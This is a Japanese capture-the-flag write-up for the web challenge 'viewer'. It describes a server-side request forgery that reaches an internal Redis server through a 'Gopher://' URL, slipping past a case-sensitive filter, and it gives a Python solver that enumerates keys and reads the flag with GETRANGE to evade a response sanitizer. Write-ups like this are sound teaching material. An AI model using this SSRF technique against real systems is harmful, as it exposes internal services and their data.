---
title: viewer
description: Writeups for TsukuCTF21 have been published. Check them out if you'd like!
author: task4233
genre: Web
solver: 8
point: 500
---

# viewer
ページにアクセスすると登録を促されるため、ユーザ名を入力して登録する。
すると、昨年のCTFのWriteupを閲覧できるページに遷移する。
selectで選択した記事を見れるサイトらしい。

## 難易度
Medium

## 解法
配布されているソースコードを読むと、redisの中にFLAGが含まれていることがわかる。
curlでredisということは、別プロトコルを利用したSSRFが思い浮かぶ。
Flagが存在している場所は`app.py` 上かredis内部であるため、いずれかの情報を抜き取りたい。
前者は `file://` scheme、後者は `gopher://` schemeを利用することになりそうだ。

しかし、前者は以下の `response_sanitizer` によってサニタイズされるため、後者を利用することにする。

```python
# app.py
# a response is also sanitized just in case because the flag is super sensitive information.
blacklist_in_response = ['TsukuCTF22']

def response_sanitizer(body: str) -> str:
    if any([scheme in body for scheme in blacklist_in_response]):
        return "SANITIZED: a sensitive data is included!"
    return body
```

`gopher://` は禁止されているように見えるが、大文字を含めることで回避できる。

ただし、gopherで対象のvalueを取るために、redisのkeyを知る必要がある。
keyはredisの `keys *` で全列挙できるため、全てのkeyを列挙してresponseにflagが含まれるものを選択すれば良い。

また、`TsukuCTF22`という文字列を含む場合はsanitizeされるが、`GETRANGE` で一部を抜き出すことで対処できる。
したがって、方針は以下の通りになる。
まず、redisに含まれるkeyを全列挙し、次にGETRANGEで列挙したものの一部を読み取る。

solverは以下の通り。

```python
import requests
from urllib.parse import quote
import re
import sys

# CHANGE HERE with an appropriate url
TARGET_URL = "http://127.0.0.1:31555"

# enumerate redis keys
form = {
    "url": "Gopher://redis:6379/+" + quote("keys *\r\nQUIT\r\n")
}
cookies = {
    "__SESSION_ID": "d8c7d141-b8da-416b-a220-d8d7218c8bbc", # dummy session id
}
res = requests.post(TARGET_URL, data=form, cookies=cookies)

session_id_list = re.findall("(.+-.+-.+-.+-.+)\r", res.text)
# print(session_id_list)

# check redis value
for session_id in session_id_list:
    form["url"] = "Gopher://redis:6379/+" + quote(f"GETRANGE {session_id} 60 -1\r\nQUIT\r\n")
    cookies["__SESSION_ID"] = session_id
    res = requests.post(TARGET_URL, data=form, cookies=cookies)
    if "CTF22{" in res.text:
        print("TsukuCTF22{" + res.text[res.text.find("CTF22{") + len("CTF22{"):res.text.find("}&#34;")] + "}")
        sys.exit(0)

```